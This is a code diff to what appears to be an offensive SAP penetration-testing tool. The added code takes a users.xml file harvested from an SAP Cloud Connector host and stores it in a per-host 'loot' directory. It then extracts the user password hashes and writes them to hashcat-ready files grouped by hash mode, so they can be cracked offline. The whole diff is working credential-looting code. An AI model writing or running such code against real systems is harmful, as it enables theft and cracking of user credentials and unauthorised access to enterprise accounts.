@@ -1993,6 +1993,19 @@ def create_app(api: SAPMAPApi) -> Bottle:
 
         # --- Parse XML ---------------------------------------------------
         print(f"[*] SCC {host}: parsing {len(xml_bytes)}B of XML")
+        # Save raw users.xml to loot regardless of parse outcome
+        try:
+            host_slug = host.replace(":", "_").replace("/", "_")
+            loot_dir = os.path.join("loot", "scc", host_slug)
+            os.makedirs(loot_dir, exist_ok=True)
+            users_xml_path = os.path.join(loot_dir, "users.xml")
+            with open(users_xml_path, "wb") as _fh:
+                _fh.write(xml_bytes)
+            os.chmod(users_xml_path, 0o600)
+            sn.users_xml_loot_path = users_xml_path
+            print(f"[+] SCC {host}: users.xml saved to {users_xml_path}")
+        except Exception as _le:
+            print(f"[-] SCC {host}: could not save users.xml to loot: {_le}")
         from sapmap_scc_keystore import parse_user_hashes_from_xml
         result = parse_user_hashes_from_xml(xml_bytes)
         if not result.get("ok"):
@@ -2022,11 +2035,30 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     f"(no hash parsed).",
                     ref="scc.users.no_hash",
                     meta={"username": u["username"]})
+        # Write hashcat-ready hash file(s) to loot
+        try:
+            from collections import defaultdict as _dd
+            by_mode = _dd(list)
+            for u in users:
+                if u.get("hashcat_line") and u.get("hashcat_mode"):
+                    by_mode[u["hashcat_mode"]].append(
+                        f"# {u['username']} ({u.get('algorithm','?')})\n"
+                        f"{u['hashcat_line']}")
+            for mode, lines in by_mode.items():
+                hc_path = os.path.join(loot_dir, f"hashes_m{mode}.txt")
+                with open(hc_path, "w") as _fh:
+                    _fh.write("\n".join(lines) + "\n")
+                os.chmod(hc_path, 0o600)
+                print(f"[+] SCC {host}: hashcat hashes (-m {mode}) → "
+                      f"{hc_path}")
+        except Exception as _he:
+            print(f"[-] SCC {host}: could not save hashcat file: {_he}")
         return json.dumps({
             "ok": True,
             "source": xml_source,
             "users": users,
             "hashcat_commands": hashcat_cmds,
+            "loot_path": users_xml_path if "users_xml_path" in dir() else "",
         })
 
     # -- Node operations --
